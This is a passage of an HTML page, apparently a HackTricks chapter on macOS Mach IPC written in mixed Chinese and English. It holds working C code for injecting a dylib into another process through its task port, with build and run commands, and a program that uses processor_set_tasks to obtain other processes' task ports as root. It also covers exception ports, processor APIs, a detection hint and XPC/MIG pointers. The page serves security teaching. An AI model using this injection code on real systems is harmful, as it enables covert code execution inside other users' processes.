+<p>const char* p = (const char*) remoteCode64;</p>
+<p>remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;</p>
+<p>printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );</p>
+<p>kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &amp;remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &amp;remoteThread );</p>
+<p>if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
+return (-3);
+}</p>
+<p>return (0);
+}</p>
+<p>int main(int argc, const char * argv[])
+{
+if (argc &lt; 3)
+{
+fprintf (stderr, "Usage: %s <em>pid</em> <em>action</em>\n", argv[0]);
+fprintf (stderr, "   <em>action</em>: path to a dylib on disk\n");
+exit(0);
+}</p>
+<p>pid_t pid = atoi(argv[1]);
+const char *action = argv[2];
+struct stat buf;</p>
+<p>int rc = stat (action, &amp;buf);
+if (rc == 0) inject(pid,action);
+else
+{
+fprintf(stderr,"Dylib not found\n");
+}</p>
+<p>}</p>
+<pre><code>&lt;/details&gt;
+```bash
+gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
+./inject &lt;pid-of-mysleep&gt; &lt;/path/to/lib.dylib&gt;
+</code></pre>
+<h3 id="线程劫持通过任务端口"><a class="header" href="#线程劫持通过任务端口">线程劫持通过任务端口 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a></a></h3>
+<p>在此技术中，进程的一个线程被劫持：</p>
+<p>{% content-ref url="macos-thread-injection-via-task-port.md" %}
+<a href="macos-thread-injection-via-task-port.html">macos-thread-injection-via-task-port.md</a>
+{% endcontent-ref %}</p>
+<h3 id="任务端口注入检测"><a class="header" href="#任务端口注入检测">任务端口注入检测</a></h3>
+<p>当调用 <code>task_for_pid</code> 或 <code>thread_create_*</code> 时，会在内核的任务结构中递增一个计数器，该计数器可以通过用户模式调用 task_info(task, TASK_EXTMOD_INFO, ...) 访问。</p>
+<h2 id="异常端口"><a class="header" href="#异常端口">异常端口</a></h2>
+<p>当线程中发生异常时，该异常会发送到线程的指定异常端口。如果线程不处理它，则会发送到任务异常端口。如果任务不处理它，则会发送到由 launchd 管理的主机端口（将在那里得到确认）。这称为异常分类。</p>
+<p>请注意，通常如果未正确处理，报告最终将由 ReportCrash 守护进程处理。然而，任务中的另一个线程可以管理该异常，这正是崩溃报告工具如 <code>PLCreashReporter</code> 所做的。</p>
+<h2 id="其他对象"><a class="header" href="#其他对象">其他对象</a></h2>
+<h3 id="时钟"><a class="header" href="#时钟">时钟</a></h3>
+<p>任何用户都可以访问有关时钟的信息，但要设置时间或修改其他设置，必须是 root。</p>
+<p>为了获取信息，可以调用 <code>clock</code> 子系统中的函数，如：<code>clock_get_time</code>、<code>clock_get_attributtes</code> 或 <code>clock_alarm</code>。<br />
+为了修改值，可以使用 <code>clock_priv</code> 子系统中的函数，如 <code>clock_set_time</code> 和 <code>clock_set_attributes</code>。</p>
+<h3 id="处理器和处理器集"><a class="header" href="#处理器和处理器集">处理器和处理器集</a></h3>
+<p>处理器 API 允许通过调用函数如 <code>processor_start</code>、<code>processor_exit</code>、<code>processor_info</code>、<code>processor_get_assignment</code> 来控制单个逻辑处理器。</p>
+<p>此外，<strong>处理器集</strong> API 提供了一种将多个处理器分组的方法。可以通过调用 <strong><code>processor_set_default</code></strong> 来检索默认处理器集。<br />
+以下是一些与处理器集交互的有趣 API：</p>
+<ul>
+<li><code>processor_set_statistics</code></li>
+<li><code>processor_set_tasks</code>：返回处理器集中所有任务的发送权限数组</li>
+<li><code>processor_set_threads</code>：返回处理器集中所有线程的发送权限数组</li>
+<li><code>processor_set_stack_usage</code></li>
+<li><code>processor_set_info</code></li>
+</ul>
+<p>正如在 <a href="https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/"><strong>这篇文章</strong></a> 中提到的，过去这允许绕过之前提到的保护，以获取其他进程中的任务端口并通过调用 <strong><code>processor_set_tasks</code></strong> 来控制它们，并在每个进程上获取主机端口。<br />
+如今，您需要 root 才能使用该功能，并且这受到保护，因此您只能在未受保护的进程上获取这些端口。</p>
+<p>您可以尝试以下代码：</p>
+<details>
+<summary><strong>processor_set_tasks 代码</strong></summary>
+````c
+// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
+//gcc ./port_pid.c -o port_pid
+<p>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/sysctl.h&gt;
+#include &lt;libproc.h&gt;
+#include &lt;mach/mach.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;string.h&gt;
+#include &lt;mach/exception_types.h&gt;
+#include &lt;mach/mach_host.h&gt;
+#include &lt;mach/host_priv.h&gt;
+#include &lt;mach/processor_set.h&gt;
+#include &lt;mach/mach_init.h&gt;
+#include &lt;mach/mach_port.h&gt;
+#include &lt;mach/vm_map.h&gt;
+#include &lt;mach/task.h&gt;
+#include &lt;mach/task_info.h&gt;
+#include &lt;mach/mach_traps.h&gt;
+#include &lt;mach/mach_error.h&gt;
+#include &lt;mach/thread_act.h&gt;
+#include &lt;mach/thread_info.h&gt;
+#include &lt;mach-o/loader.h&gt;
+#include &lt;mach-o/nlist.h&gt;
+#include &lt;sys/ptrace.h&gt;</p>
+<p>mach_port_t task_for_pid_workaround(int Pid)
+{</p>
+<p>host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
+mach_port_t   psDefault;
+mach_port_t   psDefault_control;</p>
+<p>task_array_t  tasks;
+mach_msg_type_number_t numTasks;
+int i;</p>
+<p>thread_array_t       threads;
+thread_info_data_t   tInfo;</p>
+<p>kern_return_t kr;</p>
+<p>kr = processor_set_default(myhost, &amp;psDefault);</p>
+<p>kr = host_processor_set_priv(myhost, psDefault, &amp;psDefault_control);
+if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
+mach_error("host_processor_set_priv",kr); exit(1);}</p>
+<p>printf("So far so good\n");</p>
+<p>kr = processor_set_tasks(psDefault_control, &amp;tasks, &amp;numTasks);
+if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }</p>
+<p>for (i = 0; i &lt; numTasks; i++)
+{
+int pid;
+pid_for_task(tasks[i], &amp;pid);
+printf("TASK %d PID :%d\n", i,pid);
+char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
+if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) &gt; 0) {
+printf("Command line: %s\n", pathbuf);
+} else {
+printf("proc_pidpath failed: %s\n", strerror(errno));
+}
+if (pid == Pid){
+printf("Found\n");
+return (tasks[i]);
+}
+}</p>
+<p>return (MACH_PORT_NULL);
+} // end workaround</p>
+<p>int main(int argc, char *argv[]) {
+/*if (argc != 2) {
+fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
+return 1;
+}</p>
+<p>pid_t pid = atoi(argv[1]);
+if (pid &lt;= 0) {
+fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
+return 1;
+}*/</p>
+<p>int pid = 1;</p>
+<p>task_for_pid_workaround(pid);
+return 0;
+}</p>
+<pre><code>
+</code></pre>
+</details>
+<h2 id="xpc"><a class="header" href="#xpc">XPC</a></h2>
+<h3 id="basic-information"><a class="header" href="#basic-information">Basic Information</a></h3>
+<p>XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for <strong>communication between processes</strong> on macOS and iOS. XPC provides a mechanism for making <strong>safe, asynchronous method calls between different processes</strong> on the system. It's a part of Apple's security paradigm, allowing for the <strong>creation of privilege-separated applications</strong> where each <strong>component</strong> runs with <strong>only the permissions it needs</strong> to do its job, thereby limiting the potential damage from a compromised process.</p>
+<p>For more information about how this <strong>communication work</strong> on how it <strong>could be vulnerable</strong> check:</p>
+<p>{% content-ref url="macos-xpc/" %}
+<a href="macos-xpc/">macos-xpc</a>
+{% endcontent-ref %}</p>
+<h2 id="mig---mach-interface-generator"><a class="header" href="#mig---mach-interface-generator">MIG - Mach Interface Generator</a></h2>
+<p>MIG was created to <strong>simplify the process of Mach IPC</strong> code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).</p>
+<p>MIC basically <strong>generates the needed code</strong> for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.</p>
+<p>For more info check:</p>
+<p>{% content-ref url="macos-mig-mach-interface-generator.md" %}
+<a href="macos-mig-mach-interface-generator.html">macos-mig-mach-interface-generator.md</a>
+{% endcontent-ref %}</p>
+<h2 id="references"><a class="header" href="#references">References</a></h2>
+<ul>
+<li><a href="https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html">https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html</a></li>
+<li><a href="https://knight.sc/malware/2019/03/15/code-injection-on-macos.html">https://knight.sc/malware/2019/03/15/code-injection-on-macos.html</a></li>
+<li><a href="https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a">https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a</a></li>
+<li><a href="https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/">https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/</a></li>
+<li><a href="https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/">https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/</a></li>
+<li><a href="https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X">*OS Internals, Volume I, User Mode, Jonathan Levin</a></li>
+<li><a href="https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html">https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html</a></li>
+</ul>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-function-hooking.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-function-hooking.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../elasticlunr.min.js"></script>
+        <script src="../../../../mark.min.js"></script>
+        <script src="../../../../searcher.js"></script>
+
+        <script src="../../../../clipboard.min.js"></script>
+        <script src="../../../../highlight.js"></script>
+        <script src="../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
